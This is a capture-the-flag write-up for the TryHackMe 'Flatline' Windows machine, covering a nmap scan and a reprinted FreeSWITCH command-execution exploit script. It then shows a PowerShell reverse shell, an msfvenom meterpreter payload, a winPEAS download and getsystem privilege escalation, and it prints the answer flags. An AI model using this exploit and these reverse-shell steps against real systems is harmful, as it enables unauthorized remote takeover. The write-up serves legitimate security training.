# Flatline

Laurent Chauvin | April 06, 2024

## Resources

[1] https://www.revshells.com/
[2] https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1

## Progress

```
export IP=10.10.27.157
```

Nmap scan:

```bash
nmap -sC -sV -Pn -oN nmap/initial 10.10.27.157

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 01:50 EDT
Nmap scan report for 10.10.27.157
Host is up (0.087s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-06T05:50:52+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2024-04-05T05:47:25
|_Not valid after:  2024-10-05T05:47:25
|_ssl-date: 2024-04-06T05:50:56+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds
```

We can see a RDP, as well as FreeSwitch.

When trying to connect with Remmina we're asked for username / password.

Searching for FreeSwitch exploit, we find:

```bash
searchsploit FreeSwitch             

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                                                                                                  | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                                                                                                                                                     | windows/remote/47799.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

Let's try !!

```bash
searchsploit -m multiple/remote/47698.rb

  Exploit: FreeSWITCH - Event Socket Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/47698
     Path: /usr/share/exploitdb/exploits/multiple/remote/47698.rb
    Codes: N/A
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/ctf/thm/Flatline/47698.rb
```

After copying the script in `/usr/share/metasploit-framework/modules/auxiliary`, I could start `msfconsole`:

```bash
msf6 > use auxiliary/47698

[*] Using configured payload cmd/unix/reverse
msf6 exploit(47698) > options

Module options (exploit/47698):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  ClueCon          yes       FreeSWITCH event socket password
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     8021             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)
```

However, even after setting `RHOST`, `RPORT`, `SRVHOST` and `LHOST`, I couldn't get it to work:

```bash
msf6 exploit(47698) > exploit

[*] Started reverse TCP handler on 10.6.31.49:4444 
[*] 10.10.27.157:8021 - Login success
[*] 10.10.27.157:8021 - Sending payload (323 bytes) ...
[*] 10.10.27.157:8021 - Using URL: http://10.6.31.49:8080/qtZvXj
[*] 10.10.27.157:8021 - Command Stager progress - 100.00% done (109/109 bytes)
[*] 10.10.27.157:8021 - Client 10.10.27.157 (curl/7.55.1) requested /qtZvXj;chmod
[*] 10.10.27.157:8021 - Sending payload to 10.10.27.157 (curl/7.55.1)
[*] 10.10.27.157:8021 - Server stopped.
[*] Exploit completed, but no session was created.
```

I tested different `Exploit target` but nothing.

Let's try the other script we found in `searchsploit`:

```bash
cat 47799.txt      

# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
# Date: 2019-12-19
# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
#
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
#
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
#
# nt authority\system
#

#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 3:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target> <cmd>')
    sys.exit(1)

ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='ClueCon' # default password for FreeSWITCH

s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)                                                                                                                                                                       
```

It's a python script. Let's rename it `47799.py` and execute it.

```bash
python 47799.py 10.10.27.157 whoami

Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

We are logged in as `nekrotic`. We could use this username to RDP. We need a password though.

After several unsuccessful attempt to run commands, I tried to get a powershell reverse shell from [1] (in `revshell.ps1`), and to send it to the target host:

```bash
python 47799.py 10.10.27.157 "$(cat revshell.ps1)"

Authenticated
```

while listening on port 4444

```bash
nc -lnvp 4444

listening on [any] 4444 ...
connect to [10.6.31.49] from (UNKNOWN) [10.10.27.157] 49943
SHELL>
```

And the shell dropped !!!!

```bash
SHELL> ls


    Directory: C:\Program Files\FreeSWITCH


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       09/11/2021     07:22                cert                                                                  
d-----       09/11/2021     07:22                conf                                                                  
d-----       06/04/2024     06:48                db                                                                    
d-----       09/11/2021     07:18                fonts                                                                 
d-----       09/11/2021     07:18                grammar                                                               
d-----       09/11/2021     07:18                htdocs                                                                
d-----       09/11/2021     07:18                images                                                                
d-----       09/11/2021     07:18                libmariadb_plugin                                                     
d-----       06/04/2024     06:48                log                                                                   
d-----       09/11/2021     07:18                mod                                                                   
d-----       09/11/2021     07:22                recordings                                                            
d-----       09/11/2021     07:22                run                                                                   
d-----       09/11/2021     07:22                scripts                                                               
d-----       09/11/2021     07:18                sounds                                                                
d-----       09/11/2021     07:22                storage                                                               
-a----       20/08/2019     13:08        4991488 FreeSwitch.dll                                                        
-a----       20/08/2019     13:08          26624 FreeSwitchConsole.exe                                                 
-a----       20/08/2019     13:19          62976 fs_cli.exe                                                            
-a----       13/05/2019     07:13         293888 ks.dll                                                                
-a----       20/08/2019     13:04         152064 libapr.dll                                                            
-a----       20/08/2019     13:04         134656 libaprutil.dll                                                        
-a----       20/08/2019     13:16         131584 libbroadvoice.dll                                                     
-a----       21/03/2018     20:39        1805824 libeay32.dll                                                          
-a----       23/03/2019     16:37        1050112 libmariadb.dll                                                        
-a----       20/08/2019     13:06         190464 libpng16.dll                                                          
-a----       05/04/2018     10:18         279552 libpq.dll                                                             
-a----       04/04/2018     18:59        1288192 libsndfile-1.dll                                                      
-a----       20/08/2019     13:05        1291776 libspandsp.dll                                                        
-a----       20/08/2019     13:04          27648 libteletone.dll                                                       
-a----       09/08/2018     12:42         283648 lua53.dll                                                             
-a----       09/04/2018     13:36       66362368 opencv_world341.dll                                                   
-a----       09/11/2021     07:18         825160 openh264.dll                                                          
-a----       20/08/2019     13:02           4596 OPENH264_BINARY_LICENSE.txt                                           
-a----       03/04/2018     18:31         147456 pcre.dll                                                              
-a----       20/08/2019     13:14         313856 pocketsphinx.dll                                                      
-a----       20/08/2019     13:10          49152 pthread.dll                                                           
-a----       13/05/2019     08:03         165888 signalwire_client.dll                                                 
-a----       20/08/2019     13:14         366592 sphinxbase.dll                                                        
-a----       21/03/2018     20:39         349184 ssleay32.dll                                                          
-a----       24/03/2018     20:20       15766528 v8.dll                                                                
-a----       24/03/2018     20:05         177152 v8_libbase.dll                                                        
-a----       24/03/2018     20:19         134656 v8_libplatform.dll                                                    
-a----       03/04/2018     15:01         126976 zlib.dll     
```

When looking on the deskop of `nekrotic`, we find:

```bash
SHELL> ls C:\Users\Nekrotic\Desktop


    Directory: C:\Users\Nekrotic\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       09/11/2021     07:39             38 root.txt                                                              
-a----       09/11/2021     07:39             38 user.txt  
```

By looking at it, we get the first flag:

```bash
SHELL> Get-Content C:\Users\Nekrotic\Desktop\user.txt

THM{64bca0843d535fa73eecdc59d27cbe26} 
```

For privesc, let's download WinPEAS (Powershell version) from [2].

Then let's start a webserver:

```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.38.217 - - [06/Apr/2024 03:11:45] "GET /winPEAS.ps1 HTTP/1.1" 200 -
```

And download it from the target:

```powershell
Invoke-WebRequest 10.6.31.49:8080/winPEAS.ps1 -OutFile winPEAS.ps1
```

Then run it `.\winPEAS.ps1`. However, the shell was hanging. I don't know if it's because the box is slow, or something is happening, but I canceled it.

I decided to get a better shell first.

Created a new payload with `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.31.49 LPORT=4444 -f exe > rootkit.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

Uploaded `rootkit.exe` with the same method as before.

Then, I opened `msfconsole`:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.6.31.49:4444 
[*] Sending stage (176198 bytes) to 10.10.38.217
[*] Meterpreter session 1 opened (10.6.31.49:4444 -> 10.10.38.217:49934) at 2024-04-06 03:30:31 -0400
```

I first tried to download the `root.txt`:

```bash
meterpreter > download C:\\Users\\Nekrotic\\Desktop\\root.txt
[*] Downloading: C:\Users\Nekrotic\Desktop\root.txt -> /home/kali/root.txt
[-] core_channel_open: Operation failed: Access is denied.
```

But no success.
Here, I was stuck, so I looked at a write-up, and it is stated that the `root.txt` file is probably only accessible by `SYSTEM`.

To get the right permission, we call `getsystem` from `msfconsole`:

```bash
meterpreter > getsystem

...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

Now we can try to access `root.txt`:

```bash
meterpreter > download C:\\Users\\Nekrotic\\Desktop\\root.txt
[*] Downloading: C:\Users\Nekrotic\Desktop\root.txt -> /home/kali/root.txt
[*] Downloaded 38.00 B of 38.00 B (100.0%): C:\Users\Nekrotic\Desktop\root.txt -> /home/kali/root.txt
[*] Completed  : C:\Users\Nekrotic\Desktop\root.txt -> /home/kali/root.txt
```

We have the final flag !!!

PS: On a side note, the machine is sometimes VERY slow (enough to timeout the reverse shell).

## Flag

1. User

```
THM{64bca0843d535fa73eecdc59d27cbe26} 
```

2. Privesc

```
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```
